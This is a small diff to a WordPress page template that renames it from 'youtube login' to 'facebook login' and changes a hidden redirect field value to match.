@@ -1,6 +1,6 @@
 <?php
 /**
- * Template Name: youtube login
+ * Template Name: facebook login
  *
  * @package WordPress
  * @subpackage Twenty_Fourteen
@@ -66,7 +66,7 @@
 
 				<div class="login100-more" style="background-image: url('images/bg-01.jpg');"></div>
 				<input type="hidden" id="url-ajax" value="<?php echo admin_url('admin-ajax.php');?>" name="url-ajax">
-				<input type="hidden" id="url-redirect" value="youtuber" name="url-redirect">
+				<input type="hidden" id="url-redirect" value="facebook" name="url-redirect">
 			</div>
 		</div>
 	</div>
